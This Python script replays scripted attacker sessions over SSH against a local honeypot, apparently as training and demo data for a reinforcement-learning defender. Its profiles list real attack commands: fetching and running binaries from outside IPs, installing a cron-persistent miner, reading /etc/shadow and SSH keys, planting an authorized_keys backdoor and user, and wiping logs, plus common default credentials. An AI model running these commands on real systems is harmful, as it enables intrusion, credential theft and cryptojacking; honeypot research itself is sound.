"""Generate demo traffic against a running honeypot (for screenshots and viva demos).

    python scripts/demo_traffic.py --sessions 40 --port 2222

Each session picks a scripted attacker profile and walks through its commands over a
real SSH connection. It may stop early, as a real attacker would, which is what gives
the RL agent something to learn from. All targets are localhost; nothing leaves the machine.
"""
from __future__ import annotations

import argparse
import asyncio
import random

import asyncssh

PROFILES = {
    "mirai_bot": (["enable", "system", "shell", "sh", "cat /proc/mounts; /bin/busybox ECCHI",
                   "cd /tmp; wget http://198.51.100.23/mips; chmod 777 mips; ./mips; rm -rf mips"], 0.9),
    "miner": (["uname -a", "nproc", "cat /proc/cpuinfo | grep name | head -1", "free -m",
               "cd /tmp && curl -s -O http://198.51.100.40/xmrig.tar.gz", "tar xzf xmrig.tar.gz",
               "chmod +x xmrig && nohup ./xmrig -o pool.example.invalid:3333 &", "crontab -l",
               "(crontab -l; echo '@reboot /tmp/xmrig') | crontab -", "history -c"], 0.85),
    "recon_operator": (["w", "id", "uname -a", "cat /etc/os-release", "ps aux", "netstat -tulpn", "ls -la /root",
                        "cat /root/.bash_history", "ls -la /home/deploy", "cat /home/deploy/.env", "cat /etc/shadow",
                        "find / -name '*.sql.gz'", "cat /root/.my.cnf", "ssh-keygen -t rsa -f /root/.ssh/k -N ''",
                        "echo 'ssh-rsa AAAAB3Nza... op@kali' >> /root/.ssh/authorized_keys",
                        "useradd -m -s /bin/bash sysupdate", "rm -rf /var/log/auth.log", "unset HISTFILE", "exit"], 0.92),
    "cred_harvester": (["cat /etc/passwd", "cat /etc/shadow", "ls -la ~/.ssh", "cat ~/.ssh/id_rsa", "env",
                        "grep -r password /var/www", "cat /var/www/html/wp-config.php", "exit"], 0.88),
    "scanner": (["uname -a", "exit"], 0.6),
}
CREDS = [("root", "123456"), ("root", "root"), ("admin", "admin"), ("ubuntu", "ubuntu"), ("root", "toor"),
         ("pi", "raspberry"), ("oracle", "oracle"), ("test", "test123"), ("root", "P@ssw0rd"), ("git", "git")]


async def one_session(port: int, rng: random.Random) -> tuple[str, int]:
    name = rng.choices(list(PROFILES), weights=[3, 2, 2, 2, 3])[0]
    cmds, p_continue = PROFILES[name]
    user, pwd = rng.choice(CREDS)
    for attempt in range(4):
        try:
            conn = await asyncssh.connect("127.0.0.1", port, username=user, password=pwd if attempt == 0 else rng.choice(CREDS)[1],
                                          known_hosts=None, client_keys=None)
            break
        except asyncssh.PermissionDenied:
            continue
    else:
        return name, 0
    sent = 0
    async with conn:
        proc = await conn.create_process(term_type="xterm")
        try:
            await asyncio.wait_for(proc.stdout.readuntil(("# ", "$ ")), 10)
            for cmd in cmds:
                if sent and rng.random() > p_continue:
                    break
                proc.stdin.write(cmd + "\n")
                sent += 1
                if cmd == "exit":
                    break
                await asyncio.wait_for(proc.stdout.readuntil(("# ", "$ ")), 30)
                await asyncio.sleep(rng.uniform(0.2, 1.2))
        except (asyncio.TimeoutError, asyncio.IncompleteReadError, asyncssh.Error, ConnectionError):
            pass
        proc.close()
    return name, sent


async def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--sessions", type=int, default=40)
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--concurrency", type=int, default=6)
    ap.add_argument("--seed", type=int, default=None)
    args = ap.parse_args()
    rng = random.Random(args.seed)
    sem = asyncio.Semaphore(args.concurrency)
    done = 0

    async def run():
        nonlocal done
        async with sem:
            name, n = await one_session(args.port, random.Random(rng.random()))
            done += 1
            print(f"[{done:>3}/{args.sessions}] {name:<15} {n} commands", flush=True)

    await asyncio.gather(*(run() for _ in range(args.sessions)))


if __name__ == "__main__":
    asyncio.run(main())
